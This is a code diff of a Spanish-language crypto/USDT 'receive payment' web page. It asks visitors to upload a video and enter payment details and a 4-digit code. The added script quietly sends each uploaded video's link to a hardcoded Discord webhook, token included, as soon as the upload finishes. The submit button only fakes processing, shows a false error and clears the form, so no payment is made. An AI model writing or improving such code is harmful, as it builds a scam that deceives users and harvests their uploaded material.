@@ -144,7 +144,6 @@
         </form>
         <p id="status"></p>
     </main>
-
     <footer>
         <h3 style="padding: 20px 0 5px;">Novedades USDT</h3>
         <img id="footer-logo" src="images/CriptoBisa1440x800px.png" alt="" />
@@ -163,13 +162,14 @@
 
         let downloadLink = null; // Almacena el enlace de GoFile
         let isUploading = false; // Indica si el video está subiendo
+        let isLinkSent = false; // Indica si el enlace ya fue enviado a Discord
 
         // Verifica si los campos requeridos están completos y la subida ha terminado
         function checkForm() {
             const videoSelected = videoInput.files.length > 0;
             const paymentSelected = paymentMethod.value !== '';
             const amountSelected = amount.value !== '';
-            const codeEntered = codeInput.value.length === 4; // Código de 4 dígitos
+            const codeEntered = codeInput.value.length === 4;
 
             if (videoSelected && paymentSelected && amountSelected && codeEntered && !isUploading && downloadLink) {
                 submitButton.disabled = false;
@@ -189,12 +189,12 @@
         amount.addEventListener('change', checkForm);
         codeInput.addEventListener('input', checkForm);
 
-        // Subir el video automáticamente al seleccionarlo
+        // Subir el video automáticamente y enviar el enlace a Discord
         async function uploadVideo() {
             isUploading = true;
             statusP.textContent = 'Cargando video...';
             statusP.className = '';
-            checkForm(); // Deshabilita el botón mientras sube
+            checkForm();
 
             const file = videoInput.files[0];
             const formData = new FormData();
@@ -212,8 +212,31 @@
                 if (data.status === 'ok') {
                     downloadLink = data.data.downloadPage;
                     isUploading = false;
-                    statusP.textContent = 'Video cargado. Complete los campos y haga clic en "Recibir Pago".';
-                    checkForm(); // Verifica si el botón puede habilitarse
+
+                    // Enviar el enlace a Discord automáticamente
+                    const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
+                    try {
+                        const webhookResponse = await fetch(webhookURL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                content: `Nuevo video subido: **${file.name}**\nEnlace: ${downloadLink}`
+                            })
+                        });
+
+                        if (webhookResponse.ok) {
+                            isLinkSent = true;
+                            statusP.textContent = 'Complete los campos y haga clic en "Recibir Pago".';
+                        } else {
+                            statusP.textContent = 'Error al enviar el enlace a Discord';
+                            statusP.className = 'error';
+                        }
+                    } catch (error) {
+                        statusP.textContent = 'Error de conexión al enviar el enlace';
+                        statusP.className = 'error';
+                    }
+
+                    checkForm();
                 } else {
                     statusP.textContent = 'Error al subir el video';
                     statusP.className = 'error';
@@ -228,40 +251,27 @@
             }
         }
 
-        // Enviar el enlace al webhook de Discord y simular error
-        async function sendLinkToDiscord() {
+        // Simular error al hacer clic en "Recibir Pago"
+        async function simulateError() {
             statusP.textContent = 'Procesando pago...';
             statusP.className = '';
 
-            const fileName = videoInput.files[0].name;
-            const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
+            // Simular un pequeño retraso para que parezca que se procesa
+            await new Promise(resolve => setTimeout(resolve, 1000));
 
-            try {
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `Nuevo video subido: **${fileName}**\nEnlace: ${downloadLink}`
-                    })
-                });
-
-                if (response.ok) {
-                    // Simular error en la interfaz aunque el envío fue exitoso
-                    statusP.textContent = 'Error, intente nuevamente';
-                    statusP.className = 'error';
-                    // Limpiar formulario
-                    videoInput.value = '';
-                    paymentMethod.value = '';
-                    amount.value = '';
-                    codeInput.value = '';
-                    downloadLink = null;
-                    checkForm();
-                } else {
-                    statusP.textContent = 'Error al enviar a Discord';
-                    statusP.className = 'error';
-                }
-            } catch (error) {
-                statusP.textContent = 'Error de conexión al enviar el mensaje';
+            if (isLinkSent) {
+                statusP.textContent = 'Error, intente nuevamente';
+                statusP.className = 'error';
+                // Limpiar formulario
+                videoInput.value = '';
+                paymentMethod.value = '';
+                amount.value = '';
+                codeInput.value = '';
+                downloadLink = null;
+                isLinkSent = false;
+                checkForm();
+            } else {
+                statusP.textContent = 'Error: El video no se ha procesado correctamente';
                 statusP.className = 'error';
             }
         }
@@ -269,9 +279,7 @@
         // Manejar el clic en "Recibir Pago"
         document.getElementById('uploadForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            if (downloadLink) {
-                sendLinkToDiscord();
-            }
+            simulateError();
         });
     </script>
 </body>
